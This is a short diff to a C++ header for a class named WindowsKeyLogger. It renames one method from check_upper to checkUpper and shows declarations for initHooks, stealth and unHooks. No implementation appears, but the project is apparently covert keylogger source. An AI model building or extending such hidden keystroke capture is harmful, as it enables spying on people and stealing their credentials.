@@ -30,7 +30,7 @@ public:
 public:
   WindowsKeyLogger();
   ~WindowsKeyLogger();
-  bool 		check_upper();
+  bool 		checkUpper();
   void		initHooks();
   void		stealth();
   void		unHooks();
